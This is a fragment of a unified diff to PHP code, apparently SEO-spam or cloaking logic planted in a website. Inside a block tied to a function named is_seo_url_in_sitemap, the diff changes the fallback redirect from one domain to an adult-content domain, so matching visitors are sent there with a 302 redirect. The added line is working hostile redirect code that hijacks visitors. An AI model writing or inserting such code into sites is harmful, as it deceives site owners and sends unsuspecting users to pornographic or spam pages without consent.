@@ -129,7 +129,7 @@ if (is_seo_url_in_sitemap($uri, $req, $tr)) {
         if (strpos($destination_url, 'http') === 0) {
             header("Location: " . $destination_url, true, 301);
         } else {
-            header("Location: https://topupgameku.id/", true, 302);
+            header("Location: https://javpornsub.cloud/", true, 302);
         }
         exit;
     }
